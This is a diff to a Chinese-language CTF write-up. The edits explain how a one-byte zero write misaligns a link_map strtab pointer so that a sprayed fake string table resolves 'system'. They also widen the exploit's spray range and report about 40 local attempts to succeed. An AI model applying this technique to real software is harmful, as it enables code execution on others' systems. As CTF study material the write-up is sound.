@@ -134,7 +134,13 @@ pwndbg> x/32s 0x7ffff7e97408
 0x7ffff7e97472: "getPass"
 ```
 
-上述伪造建立在我们输入的参数
+现在已经明确把一字节 0 写到什么地方了：
+
+- 通过漏洞造成上述 0x7ffff7fbc248 地址上的内容错位，待解析的 strtab 指向
+  - 存放了指向
+    - 存放伪造了 strtab 内容的字符串数组减去 8 的地址
+
+恰巧我们输入的参数会被解析成字符串数组，放在 `libctfc.so + 0x40c0` 的数组中，这也在 `link_map` 的地址之前，因此是有概率命中的。
 
 ## Exploitation
 
@@ -191,7 +197,7 @@ while True:
             return payload
 
         spary_payload = b""
-        for i in range(0xC0 + 0x10, 0x5000, 8):
+        for i in range(0xC0 + 0x10, 0x8000, 8):
             if ((i - 8) & 0xFFF) == 0xEA0:
                 spary_payload += b"&" + b"a" * 0x69 + b"%00system%00"
             else:
@@ -216,6 +222,8 @@ while True:
 # buf = 0x7ffff7e96300
 # target_strtab = 0x7ffff7fbc248
 ```
+
+测试下来本地在上述构造下 40 次左右就能成功。
 
 ---
 
